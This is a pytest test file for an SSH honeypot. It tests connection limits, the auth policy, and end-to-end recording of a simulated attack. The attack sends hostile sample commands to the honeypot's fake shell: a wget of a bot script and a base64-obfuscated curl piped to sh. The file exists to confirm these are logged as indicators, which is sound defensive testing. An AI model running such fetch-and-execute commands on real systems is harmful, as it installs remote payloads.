"""End-to-end: start a real honeypot on a random port and attack it with Paramiko."""

import base64
import dataclasses
import sqlite3
import threading
import time

import paramiko
import pytest

from honeypot.config import HoneypotSettings
from honeypot.server import AuthPolicy, ConnectionLimiter, HoneypotServer


# ------------------------------------------------------------------ units
def test_connection_limiter():
    lim = ConnectionLimiter(max_total=3, max_per_ip=2)
    assert lim.acquire("a") and lim.acquire("a")
    assert not lim.acquire("a")  # per-IP cap
    assert lim.acquire("b")
    assert not lim.acquire("c")  # global cap
    lim.release("a")
    assert lim.acquire("c")


@pytest.mark.parametrize(
    ("mode", "creds", "attempt", "expected"),
    [
        ("list", ("root", "root"), 1, True),
        ("list", ("root", "nope"), 1, False),
        ("list", ("admin", "anything"), 1, True),  # admin:* wildcard
        ("after_n", ("x", "y"), 2, False),
        ("after_n", ("x", "y"), 3, True),
        ("any", ("x", "y"), 1, True),
        ("never", ("root", "root"), 1, False),
    ],
)
def test_auth_policy(mode, creds, attempt, expected):
    s = dataclasses.replace(
        HoneypotSettings(), auth_mode=mode, accept_after=3, accepted_creds=frozenset({("root", "root"), ("admin", "*")})
    )
    assert AuthPolicy(s).decide(*creds, attempt) is expected


def test_invalid_config_is_rejected():
    with pytest.raises(ValueError, match="HP_AUTH_MODE"):
        dataclasses.replace(HoneypotSettings(), auth_mode="maybe")
    with pytest.raises(ValueError, match="HP_SSH_BANNER"):
        dataclasses.replace(HoneypotSettings(), ssh_banner="OpenSSH")


# ------------------------------------------------------------ end-to-end
@pytest.fixture()
def honeypot(tmp_path):
    settings = dataclasses.replace(
        HoneypotSettings(),
        bind_host="127.0.0.1",
        port=0,
        auth_mode="list",
        accepted_creds=frozenset({("root", "root")}),
        db_path=tmp_path / "hp.db",
        host_key_path=tmp_path / "key",
        jsonl_file=tmp_path / "events.jsonl",
        idle_timeout=10,
    )
    server = HoneypotServer(settings)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    assert server.ready.wait(10)
    yield server, settings
    server.shutdown()
    thread.join(5)
    server.store.close()


def _connect(port, user, pwd):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(
            "127.0.0.1",
            port=port,
            username=user,
            password=pwd,
            allow_agent=False,
            look_for_keys=False,
            timeout=10,
            banner_timeout=10,
            auth_timeout=10,
        )
    except Exception:
        c.close()
        raise
    return c


def _count(db_path, sql, expected, timeout=5.0):
    """Poll until the query returns >= expected (writes happen on server threads)."""
    deadline = time.time() + timeout
    value = 0
    while time.time() < deadline:
        conn = sqlite3.connect(db_path)
        value = conn.execute(sql).fetchone()[0]
        conn.close()
        if value >= expected:
            break
        time.sleep(0.1)
    return value


def _recv_until(chan, needle, timeout=5.0):
    buf, deadline = "", time.time() + timeout
    while needle not in buf and time.time() < deadline:
        if chan.recv_ready():
            buf += chan.recv(65535).decode("utf-8", "replace")
        else:
            time.sleep(0.05)
    return buf


def test_full_attack_is_recorded(honeypot):
    server, settings = honeypot
    port = server.bound_port

    with pytest.raises(paramiko.AuthenticationException):
        _connect(port, "admin", "wrong-pass")

    # exec channel: `ssh root@host whoami`
    client = _connect(port, "root", "root")
    _, out, _ = client.exec_command("whoami")
    assert out.read().decode().strip() == "root"
    assert out.channel.recv_exit_status() == 0
    client.close()

    # interactive shell with a pty
    client = _connect(port, "root", "root")
    chan = client.invoke_shell()
    banner = _recv_until(chan, "# ")
    assert "Ubuntu" in banner and "root@" in banner
    chan.send("wget http://198.51.100.1/bot.sh\r")
    assert "unable to resolve" in _recv_until(chan, "unable to resolve")
    payload = base64.b64encode(b"curl http://198.51.100.77/m").decode()
    chan.send(f"echo {payload} | base64 -d | sh\r")
    _recv_until(chan, "Could not resolve")
    chan.send("exit\r")
    time.sleep(0.3)
    client.close()

    db = settings.db_path
    assert _count(db, "SELECT COUNT(*) FROM auth_attempts WHERE success=0 AND password='wrong-pass'", 1) == 1
    assert _count(db, "SELECT COUNT(*) FROM auth_attempts WHERE success=1", 2) >= 2
    assert _count(db, "SELECT COUNT(*) FROM commands", 3) >= 3
    assert _count(db, "SELECT COUNT(*) FROM iocs WHERE value='http://198.51.100.1/bot.sh'", 1) == 1
    # URL hidden inside the base64 payload was still extracted
    assert _count(db, "SELECT COUNT(*) FROM iocs WHERE value='http://198.51.100.77/m'", 1) == 1
    assert _count(db, "SELECT COUNT(*) FROM sessions WHERE client_version LIKE 'SSH-2.0-%'", 3) >= 3
    assert _count(db, "SELECT COUNT(*) FROM sessions WHERE end_reason='logout'", 1) == 1


def test_port_forwarding_is_refused_and_logged(honeypot):
    server, settings = honeypot
    client = _connect(server.bound_port, "root", "root")
    with pytest.raises(paramiko.ChannelException):
        client.get_transport().open_channel("direct-tcpip", ("93.184.216.34", 80), ("127.0.0.1", 1234))
    client.close()
    assert _count(settings.db_path, "SELECT COUNT(*) FROM iocs WHERE ioc_type='proxy-attempt'", 1) == 1
